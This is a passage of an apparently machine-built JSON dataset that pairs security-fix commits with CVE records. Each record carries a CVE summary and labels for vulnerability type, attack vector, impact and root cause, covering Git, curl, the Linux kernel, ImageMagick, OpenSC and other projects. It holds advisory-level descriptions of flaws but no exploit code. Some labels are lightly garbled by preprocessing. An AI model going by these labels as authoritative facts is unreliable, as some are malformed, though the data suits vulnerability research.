other 32bit overflows","summary":"utils\/ut_ws_svr.c in ViaBTC Exchange Server before 2018-08-21 has an integer overflow leading to memory corruption.","commit_message_1":"merge pull request # <number> from benjaminchodroff\/master","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-9fabc53ea796ec492aef432594298baa","cve_id":"CVE-2018-17569","cwe_id":"CWE-190","commit_message":"Merge pull request #131 from benjaminchodroff\/master\n\nfix memory corruption and other 32bit overflows","summary":"network\/nw_buf.c in ViaBTC Exchange Server before 2018-08-21 has an integer overflow leading to memory corruption.","commit_message_1":"merge pull request # <number> from benjaminchodroff\/master","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-0c23effa84a7b85053bac7981a8580c8","cve_id":"CVE-2018-17568","cwe_id":"CWE-190","commit_message":"Merge pull request #131 from benjaminchodroff\/master\n\nfix memory corruption and other 32bit overflows","summary":"utils\/ut_rpc.c in ViaBTC Exchange Server before 2018-08-21 has an integer overflow leading to memory corruption.","commit_message_1":"merge pull request # <number> from benjaminchodroff\/master","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"a124133e1e6ab5c7a9fef6d0e6bcb084e3455b46","cve_id":"CVE-2018-17456","cwe_id":"CWE-20","commit_message":"fsck: detect submodule urls starting with dash\n\nUrls with leading dashes can cause mischief on older\nversions of Git. We should detect them so that they can be\nrejected by receive.fsckObjects, preventing modern versions\nof git from being a vector by which attacks can spread.\n\nSigned-off-by: Jeff King <peff@peff.net>\nSigned-off-by: Junio C Hamano <gitster@pobox.com>","summary":"Git before 2.14.5, 2.15.x before 2.15.3, 2.16.x before 2.16.5, 2.17.x before 2.17.2, 2.18.x before 2.18.1, and 2.19.x before 2.19.1 allows remote code execution during processing of a recursive *git clone* of a superproject if a .gitmodules file has a URL field beginning with a '-' character.","commit_message_1":"detect submodule url starting with dash url with leading dash can cause mischief on older version of git","Vulnerability Type":"Improper Input Validation","Attack Vector":"By using a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"caused by a flaw during processing of a recursive \"git clone\" of a superproject","Attack Type":"remote attacker"},{"commit_id":"6ed0077520e2b0da1fd060c7f88db7b2e6068e4c","cve_id":"CVE-2018-17407","cwe_id":"CWE-119","commit_message":"writet1 protection against buffer overflow\n\ngit-svn-id: svn:\/\/tug.org\/texlive\/trunk\/Build\/source@48697 c570f23f-e606-0410-a88d-b1316a301751","summary":"An issue was discovered in t1_check_unusual_charstring functions in writet1.c files in TeX Live before 2018-09-21. A buffer overflow in the handling of Type 1 fonts allows arbitrary code execution when a malicious font is loaded by one of the vulnerable tools: pdflatex, pdftex, dvips, or luatex.","commit_message_1":"writet1 protection against buffer overflow","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted font","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds of checking by the Type 1 fonts","Attack Type":"remote attacker"},{"commit_id":"31d670b6489e6d708c3b04b911cdf14ac43d846d","cve_id":"CVE-2018-17293","cwe_id":"CWE-476","commit_message":"Fix dereferencing null pointer when running wavm with WebAssembly main function that takes command-line arguments but no Emscripten memory to write them to","summary":"An issue was discovered in WAVM before 2018-09-16. The run function in Programs\/wavm\/wavm.cpp does not check whether there is Emscripten memory to store the command-line arguments passed by the input WebAssembly file's main function, which allows attackers to cause a denial of service (application crash by NULL pointer dereference) or possibly have unspecified other impact by crafting certain WebAssembly files.","commit_message_1":"fix dereferencing null pointer when running wavm with webassembly main function that take command-line argument but no emscripten memory to write them to","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by crafting certain webassembly files","Impact":"cause a denial of service ( application crash by pointer dereference ) or possibly have unspecified other impact","Root Cause":"does not check whether there is emscripten memory to store the command - line arguments passed by the input webassembly file ' s main function","Attack Type":"remote attacker"},{"commit_id":"2de6cf70c5ef31e22ed119a25ac2daeefd3d18a1","cve_id":"CVE-2018-17292","cwe_id":"CWE-125","commit_message":"Fix out-of-bounds array access when passing a <4 byte input file to wavm or wavm-compile","summary":"An issue was discovered in WAVM before 2018-09-16. The loadModule function in Include\/Inline\/CLI.h lacks checking of the file length before a file magic comparison, allowing attackers to cause a Denial of Service (application crash caused by out-of-bounds read) by crafting a file that has fewer than 4 bytes.","commit_message_1":"fix out-of-bounds array access when passing a < <number> byte input file to wavm or wavm-compile","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"by crafting a file that has fewer than 4 bytes","Impact":"cause a denial of service ( application crash caused by out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"9237a63c47bd314b807cda0bd2216264e82edbe8","cve_id":"CVE-2018-17206","cwe_id":null,"commit_message":"ofp-actions: Avoid buffer overread in BUNDLE action decoding.\n\nReported-at: https:\/\/bugs.chromium.org\/p\/oss-fuzz\/issues\/detail?id=9052\nSigned-off-by: Ben Pfaff <blp@ovn.org>\nAcked-by: Justin Pettit <jpettit@ovn.org>","summary":"An issue was discovered in Open vSwitch (OvS) 2.7.x through 2.7.6. The decode_bundle function inside lib\/ofp-actions.c is affected by a buffer over-read issue during BUNDLE action decoding.","commit_message_1":"avoid buffer overread in bundle action decoding","Vulnerability Type":"unspecified","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over read","Attack Type":"remote attacker"},{"commit_id":"7a9cdebdcc17e426fb5287e4a82db1dfe86339b2","cve_id":"CVE-2018-17182","cwe_id":"CWE-416","commit_message":"mm: get rid of vmacache_flush_all() entirely\n\nJann Horn points out that the vmacache_flush_all() function is not only\npotentially expensive, it's buggy too.  It also happens to be entirely\nunnecessary, because the sequence number overflow case can be avoided by\nsimply making the sequence number be 64-bit.  That doesn't even grow the\ndata structures in question, because the other adjacent fields are\nalready 64-bit.\n\nSo simplify the whole thing by just making the sequence number overflow\ncase go away entirely, which gets rid of all the complications and makes\nthe code faster too.  Win-win.\n\n[ Oleg Nesterov points out that the VMACACHE_FULL_FLUSHES statistics\n  also just goes away entirely with this ]\n\nReported-by: Jann Horn <jannh@google.com>\nSuggested-by: Will Deacon <will.deacon@arm.com>\nAcked-by: Davidlohr Bueso <dave@stgolabs.net>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"An issue was discovered in the Linux kernel through 4.18.8. The vmacache_flush_all function in mm\/vmacache.c mishandles sequence number overflows. An attacker can trigger a use-after-free (and possibly gain privileges) via certain thread creation, map, unmap, invalidation, and dereference operations.","commit_message_1":"get rid of vmacache_flush_all ( ) entirely jann horn point out that the vmacache_flush_all ( ) function is not only potentially expensive , it 's buggy too","Vulnerability Type":"Use After Free","Attack Vector":"via certain thread creation , map , unmap , invalidation , and dereference operations","Impact":"gain elevated privileges","Root Cause":"caused by the improper handling of sequence number overflows by the vmacache_flush_all function","Attack Type":"local attacker"},{"commit_id":"23b057742e3cf199612fa8050ae86cae675e214e","cve_id":"CVE-2018-17082","cwe_id":"CWE-79","commit_message":"Fix for bug #76582\n\nThe brigade seems to end up in a messed up state if something fails\nin shutdown, so we clean it up.","summary":"The Apache2 component in PHP before 5.6.38, 7.0.x before 7.0.32, 7.1.x before 7.1.22, and 7.2.x before 7.2.10 allows XSS via the body of a *Transfer-Encoding: chunked* request, because the bucket brigade is mishandled in the php_handler function in sapi\/apache2handler\/sapi_apache2.c.","commit_message_1":"fix for bug # <number> the brigade seems to end up in a messed up state if something fails in shutdown , so we clean it up","Vulnerability Type":"Cross-site Scripting","Attack Vector":"using the body of a \"Transfer-Encoding: chunked\" request to execute script in a victim's Web browser within the security context of the hosting Web site","Impact":"steal the victim's cookie-based authentication credentials","Root Cause":"caused by improper validation of user-supplied input by the Apache2 component","Attack Type":"remote attacker"},{"commit_id":"c2b18849f8bb833253538f5dfedb4ed1dc176a30","cve_id":"CVE-2018-17019","cwe_id":"CWE-20","commit_message":"Fix IRC names command parsing","summary":"In Bro through 2.5.5, there is a DoS in IRC protocol names command parsing in analyzer\/protocol\/irc\/IRC.cc.","commit_message_1":"fix irc name command parsing","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper input validation by the IRC protocol names command parsing","Attack Type":"remote attacker"},{"commit_id":"d530e92f59ae9bb2d47066c3c460b25d2ffeb211","cve_id":"CVE-2018-16842","cwe_id":"CWE-125","commit_message":"voutf: fix bad arethmetic when outputting warnings to stderr\n\nCVE-2018-16842\nReported-by: Brian Carpenter\nBug: https:\/\/curl.haxx.se\/docs\/CVE-2018-16842.html","summary":"Curl versions 7.14.1 through 7.61.1 are vulnerable to a heap-based buffer over-read in the tool_msgs.c:voutf() function that may result in information exposure and denial of service.","commit_message_1":"fix bad arethmetic when outputting warning to stderr <cve_id>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending an overly long message","Impact":"obtain sensitive information","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"81d135d67155c5295b1033679c606165d4e28f3f","cve_id":"CVE-2018-16840","cwe_id":"CWE-416","commit_message":"Curl_close: clear data->multi_easy on free to avoid use-after-free\n\nRegression from b46cfbc068 (7.59.0)\nCVE-2018-16840\nReported-by: Brian Carpenter (Geeknik Labs)\n\nBug: https:\/\/curl.haxx.se\/docs\/CVE-2018-16840.html","summary":"A heap use-after-free flaw was found in curl versions from 7.59.0 through 7.61.1 in the code related to closing an easy handle. When closing and cleaning up an 'easy' handle in the `Curl_close()` function, the library code first frees a struct (without nulling the pointer) and might then subsequently erroneously write to a struct field within that already freed struct.","commit_message_1":"clear data- > multi_easy on free to avoid use-after-free regression from b46cfbc068 ( <file>","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a heap use-after-free flaw","Attack Type":"remote attacker"},{"commit_id":"f3a24d7916b9173c69a3e0ee790102993833d6c5","cve_id":"CVE-2018-16839","cwe_id":"CWE-119","commit_message":"Curl_auth_create_plain_message: fix too-large-input-check\n\nCVE-2018-16839\nReported-by: Harry Sintonen\nBug: https:\/\/curl.haxx.se\/docs\/CVE-2018-16839.html","summary":"Curl versions 7.33.0 through 7.61.1 are vulnerable to a buffer overrun in the SASL authentication code that may lead to denial of service.","commit_message_1":"curl_auth_create_plain_message : fix too-large-input-check","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a user name that exceeds 2 GB","Impact":"overflow a buffer and cause a denial of service","Root Cause":"caused by the incorrect verification of the passed-in lengths for the name and password fields by the Curl_auth_create_plain_message function","Attack Type":"remote attacker"},{"commit_id":"0d9a4d98bfdf4acd2c0138d4aaeb4e2e0934bd84","cve_id":"CVE-2018-16790","cwe_id":"CWE-125","commit_message":"Fix for CVE-2018-16790 -- Verify bounds before binary length read.\n\nAs reported here: https:\/\/jira.mongodb.org\/browse\/CDRIVER-2819,\na heap overread occurs due a failure to correctly verify data\nbounds.\n\nIn the original check, len - o returns the data left including the\nsizeof(l) we just read. Instead, the comparison should check\nagainst the data left NOT including the binary int32, i.e. just\nsubtype (byte*) instead of int32 subtype (byte*).\n\nAdded in test for corrupted BSON example.","summary":"_bson_iter_next_internal in bson-iter.c in libbson 1.12.0, as used in MongoDB mongo-c-driver and other products, has a heap-based buffer over-read via a crafted bson buffer.","commit_message_1":"fix for <cve_id> -- verify bound before binary length read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending an overly long bson buffer","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over-read flaw","Attack Type":"remote attacker"},{"commit_id":"1007b98f8795ad4bea6bc5f68a32d83e982fdae4","cve_id":"CVE-2018-16749","cwe_id":"CWE-617","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1119","summary":"In ImageMagick 7.0.7-29 and earlier, a missing NULL check in ReadOneJNGImage in coders\/png.c allows an attacker to cause a denial of service (WriteBlob assertion failure and application exit) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Reachable Assertion","Attack Vector":"via a crafted file .","Impact":"cause a denial of service","Root Cause":"caused by a missing NULL check","Attack Type":"remote attacker"},{"commit_id":"8f3fafc9c2f0ece10832c25f7ffcb07c97a32ad4","cve_id":"CVE-2018-16658","cwe_id":"CWE-200","commit_message":"cdrom: Fix info leak\/OOB read in cdrom_ioctl_drive_status\n\nLike d88b6d04: \"cdrom: information leak in cdrom_ioctl_media_changed()\"\n\nThere is another cast from unsigned long to int which causes\na bounds check to fail with specially crafted input. The value is\nthen used as an index in the slot array in cdrom_slot_status().\n\nSigned-off-by: Scott Bauer <scott.bauer@intel.com>\nSigned-off-by: Scott Bauer <sbauer@plzdonthack.me>\nCc: stable@vger.kernel.org\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"An issue was discovered in the Linux kernel before 4.18.6. An information leak in cdrom_ioctl_drive_status in drivers\/cdrom\/cdrom.c could be used by local attackers to read kernel memory because a cast from unsigned long to int interferes with bounds checking. This is similar to CVE-2018-10940.","commit_message_1":"fix info leak\/oob read in cdrom_ioctl_drive_status like d88b6d04 : `` cdrom : information leak in cdrom_ioctl_media_changed ( ) '' there is another cast from unsigned long to int which cause a bound check to fail with specially crafted input","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By using a specially-crafted ioctl","Impact":"read kernel memory because a cast from unsigned long to int interferes with bounds checking","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"ecb31dbad39ccdc65868d5d2a37f0f0521250832","cve_id":"CVE-2018-16645","cwe_id":"CWE-770","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1268","summary":"There is an excessive memory allocation issue in the functions ReadBMPImage of coders\/bmp.c and ReadDIBImage of coders\/dib.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Allocation of Resources Without Limits or Throttling","Attack Vector":"via a crafted image file","Impact":"cause a denial of service","Root Cause":"caused by an excessive memory allocation issue","Attack Type":"remote attacker"},{"commit_id":"afa878a689870c28b6994ecf3bb8dbfb2b76d135","cve_id":"CVE-2018-16644","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1269","summary":"There is a missing check for length in the functions ReadDCMImage of coders\/dcm.c and ReadPICTImage of coders\/pict.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted image","Impact":"cause a denial of service","Root Cause":"caused by a missing check for length","Attack Type":"remote attacker"},{"commit_id":"6b6bff054d569a77973f2140c0e86366e6168a6c","cve_id":"CVE-2018-16643","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1199","summary":"The functions ReadDCMImage in coders\/dcm.c, ReadPWPImage in coders\/pwp.c, ReadCALSImage in coders\/cals.c, and ReadPICTImage in coders\/pict.c in ImageMagick 7.0.8-4 do not check the return value of the fputc function, which allows remote attackers to cause a denial of service via a crafted image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by missing check for fputc function","Attack Type":"remote attacker"},{"commit_id":"cc4ac341f29fa368da6ef01c207deaf8c61f6a2e","cve_id":"CVE-2018-16642","cwe_id":"CWE-787","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1162","summary":"The function InsertRow in coders\/cut.c in ImageMagick 7.0.7-37 allows remote attackers to cause a denial of service via a crafted image file due to an out-of-bounds write.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted image file due to an out - of - bounds write","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"256825d4eb33dc301496710d15cf5a7ae924088b","cve_id":"CVE-2018-16641","cwe_id":"CWE-772","commit_message":"Fixed possible memory leak reported in #1206","summary":"ImageMagick 7.0.8-6 has a memory leak vulnerability in the TIFFWritePhotoshopLayers function in coders\/tiff.c.","commit_message_1":"fixed possible memory leak reported in # <number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"76efa969342568841ecf320b5a041685a6d24e0b","cve_id":"CVE-2018-16640","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1201","summary":"ImageMagick 7.0.8-5 has a memory leak vulnerability in the function ReadOneJNGImage in coders\/png.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"768f70ca405cd3159d990e962d54456773bb8cf8","cve_id":"CVE-2018-16435","cwe_id":"CWE-190","commit_message":"Upgrade Visual studio 2017 15.8\n\n- Upgrade to 15.8\n- Add check on CGATS memory allocation (thanks to Quang Nguyen for\npointing out this)","summary":"Little CMS (aka Little Color Management System) 2.9 has an integer overflow in the AllocateDataSet function in cmscgats.c, leading to a heap-based buffer overflow in the SetData function via a crafted file in the second argument to cmsIT8LoadFromFile.","commit_message_1":"upgrade visual studio <number> <file>","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by improper bounds checking by the AllocateDataSet function","Attack Type":"remote attacker"},{"commit_id":"03628449b75a93787eb2359412a3980365dda49b#diff-f8c0128e14031ed9307d47f10f601b54","cve_id":"CVE-2018-16426","cwe_id":"CWE-674","commit_message":"iasecc: fixed unbound recursion","summary":"Endless recursion when handling responses from an IAS-ECC card in iasecc_select_file in libopensc\/card-iasecc.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to hang or crash the opensc library using programs.","commit_message_1":"iasecc : fixed unbound recursion","Vulnerability Type":"Uncontrolled Recursion","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"cause a denial of service","Root Cause":"caused by an unbound recursion flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-d643a0fa169471dbf2912f4866dc49c5","cve_id":"CVE-2018-16425","cwe_id":"CWE-415","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"A double free when handling responses from an HSM Card in sc_pkcs15emu_sc_hsm_init in libopensc\/pkcs15-sc-hsm.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"double free","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-476b3b2a03c4eef331b4b0bfece4b063","cve_id":"CVE-2018-16424","cwe_id":"CWE-415","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"A double free when handling responses in read_file in tools\/egk-tool.c (aka the eGK card tool) in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"double free","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"cause a denial of service","Root Cause":"caused by a double free flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-db0cd89ff279ad8c7b3bb780cdf2770a","cve_id":"CVE-2018-16423","cwe_id":"CWE-415","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"A double free when handling responses from a smartcard in sc_file_set_sec_attr in libopensc\/sc.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"double free","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"cause a denial of service","Root Cause":"caused by a double free flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-d64c08c80437cf0006ada91e50f20ba0","cve_id":"CVE-2018-16422","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"A single byte buffer overflow when handling responses from an esteid Card in sc_pkcs15emu_esteid_init in libopensc\/pkcs15-esteid.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"supply crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an off-by-one write flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-848b13147a344ba2c6361d91ca77feb1","cve_id":"CVE-2018-16421","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from a CAC Card in cac_get_serial_nr_from_CUID in libopensc\/card-cac.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-b36536074d13447fbbec061e0e64d15d","cve_id":"CVE-2018-16420","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from an ePass 2003 Card in decrypt_response in libopensc\/card-epass2003.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-a6074523a9cbd875e26c58e20868fb15","cve_id":"CVE-2018-16419","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from a Cryptoflex card in read_public_key in tools\/cryptoflex-tool.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by buffer overflows","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-628c8445c4e7ae92bbc4be08ba11a4c3","cve_id":"CVE-2018-16418","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"A buffer overflow when handling string concatenation in util_acl_to_str in tools\/util.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a smartcard to send responses to APDU commands","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"physical attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad","cve_id":"CVE-2018-16393","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from a Gemsafe V1 Smartcard in gemsafe_get_cert_len in libopensc\/pkcs15-gemsafeV1.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted smartcard","Impact":"supply crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by buffer overflows when handling responses from a Gemsafe V1 Smartcard","Attack Type":"local attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-b2a356323a9ff2024d041cf2d7e89dd3","cve_id":"CVE-2018-16392","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from a TCOS Card in tcos_select_file in libopensc\/card-tcos.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted smartcard","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by buffer overflows when handling responses from a TCOS Card","Attack Type":"local attacker"},{"commit_id":"360e95d45ac4123255a4c796db96337f332160ad#diff-477b7a40136bb418b10ce271c8664536","cve_id":"CVE-2018-16391","cwe_id":"CWE-119","commit_message":"fixed out of bounds writes\n\nThanks to Eric Sesterhenn from X41 D-SEC GmbH\nfor reporting the problems.","summary":"Several buffer overflows when handling responses from a Muscle Card in muscle_list_files in libopensc\/card-muscle.c in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to cause a denial of service (application crash) or possibly have unspecified other impact.","commit_message_1":"fixed out of bound writes thanks to eric sesterhenn from x41 d-sec gmbh for reporting the problem","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted smartcard","Impact":"crafted smartcards to cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by buffer overflows when handling responses from a Muscle Card","Attack Type":"local attacker"},{"commit_id":"216d117f05bff87b9dc4db55a1b1fadb38bcb786","cve_id":"CVE-2018-16323","cwe_id":"CWE-200","commit_message":"XBM coder leaves the hex image data uninitialized if hex value of the pixel is negative","summary":"ReadXBMImage in coders\/xbm.c in ImageMagick before 7.0.8-9 leaves data uninitialized when processing an XBM file that has a negative pixel value. If the affected code is used as a library loaded into a process that includes sensitive information, that information sometimes can be leaked via the image data.","commit_message_1":"xbm coder leaf the hex image data uninitialized if hex value of the pixel is negative","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"f1e255d60ae66a9f672ff9a207ee6cd8e33d2679","cve_id":"CVE-2018-16276","cwe_id":"CWE-20","commit_message":"USB: yurex: fix out-of-bounds uaccess in read handler\n\nIn general, accessing userspace memory beyond the length of the supplied\nbuffer in VFS read\/write handlers can lead to both kernel memory corruption\n(via kernel_read()\/kernel_write(), which can e.g. be triggered via\nsys_splice()) and privilege escalation inside userspace.\n\nFix it by using simple_read_from_buffer() instead of custom logic.\n\nFixes: 6bc235a2e24a (\"USB: add driver for Meywa-Denki & Kayac YUREX\")\nSigned-off-by: Jann Horn <jannh@google.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"An issue was discovered in yurex_read in drivers\/usb\/misc\/yurex.c in the Linux kernel before 4.17.7. Local attackers could use user access read\/writes with incorrect bounds checking in the yurex USB driver to crash the kernel or potentially escalate privileges.","commit_message_1":"yurex : fix 